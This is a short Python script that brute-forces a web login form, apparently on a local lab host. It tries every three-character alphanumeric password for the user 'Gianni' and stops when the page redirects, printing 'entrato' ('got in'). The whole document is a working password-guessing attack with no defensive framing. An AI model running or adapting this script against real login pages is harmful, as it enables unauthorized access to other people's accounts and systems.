import requests
import string
import sys

url="http://192.168.0.136:5000/"
an=string.printable[:-38]

for i in range(62):
    for k in range(62):
        for j in range(62):
            psw=f"{an[i]}{an[k]}{an[j]}"
            x=requests.post(url,data={'username':'Gianni','password':psw})
            print(psw)
            if x.url != url:
                print("entrato")
                sys.exit()